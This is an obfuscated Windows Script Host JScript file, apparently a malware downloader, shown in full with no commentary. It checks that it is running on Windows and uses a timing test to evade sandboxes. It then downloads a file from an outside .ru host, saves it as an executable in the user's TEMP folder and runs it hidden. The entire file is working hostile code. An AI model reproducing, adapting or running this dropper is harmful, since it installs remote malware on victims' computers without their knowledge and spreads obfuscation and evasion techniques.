var _D = false;
var _O = "CreateObject";
var _PR = function _J() {return WScript[_O]("WScript"+".Shell");}(), _LB = 11;
var _GF0 = "MSXML2.XMLHTTP";
var _MH = 2123213;
var _VU = 0;
function _I(_SF){_PR["Run"](_SF, _VU, _VU);};
function _KD(){return _GF0 + "";};
function _GF(_GF1, _EG){_VU = _VU * 1; return _GF1 - _EG;};
function _N(){return _O;};
/*@cc_on
  @if (@_win32 || @_win64)
    _D = true;
  @end
@*/
if (_D)
{
var _U = "";
function _VG(){return 22;};
var _E = 0; var _N0 = 0;
function _NE()
{
var _WK = new this["Date"]();
var _VS = _WK["getUTCMilliseconds"]();
WScript["Sleep"](_VG());
var _WK = new this["Date"]();
var _SW = _WK["getUTCMilliseconds"]();
WScript["Sleep"](_VG());
var _WK = new this["Date"]();
var _VZ = _WK["getUTCMilliseconds"]();
var _E = "_M";
_E = _GF(_SW, _VS);
var _N0 = "_TE";
_N0 = _GF(_VZ, _SW);
_U = "open";
return _GF(_E, _N0);
}
var _Z = false;
var _XN = false;
for (var _U0 = _VU; _U0 < _VG() * 1; _U0++){if (_NE() != _VU){
_Z = true; 
_N0 = "31" + 11 * _E + _N0; 
_XN = true; 
break;
}}
function _XW() {return ((_Z == true) && (_Z == _XN)) ? 1 : _VU;};
if (_Z && _XW() && _XN){
function _KO() {return _PR["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "itGqOA98BOU87OG9.ex" + "e";};
 _QP = _KD();
 _B = WScript[_O](_QP);
 var _A = 1;
 while (_A){
try {
	if (_A == 1)
	{
		_B[_U]("GET", "http://ru-optovik.ru/j9ssl", false);
		_B["send"]();
		_FY = "Sleep";
	}
	WScript[_FY](_VG() + 120); 
	if (_B["readystate"] < 2 * 2) continue;
	_A = _VU;
	function _P(_K) {var _MO = (1, 2, 3, 4, 5, _K); return _MO;};
	_C = WScript[_N()]("ADODB.Stream");
	_QP = _C;
	_QP[_U]();
	_QP["type"] = _P(1);
	_QP["write"](_B["ResponseBody"]);
	_C["position"] = _P(_VU);
	_QP["Save" + "ToFile"](_KO(), 2);
	_C["cl"+"ose"]();
	_YM = _KO();
	_I(_YM);
} catch(_S){};
}
}
}

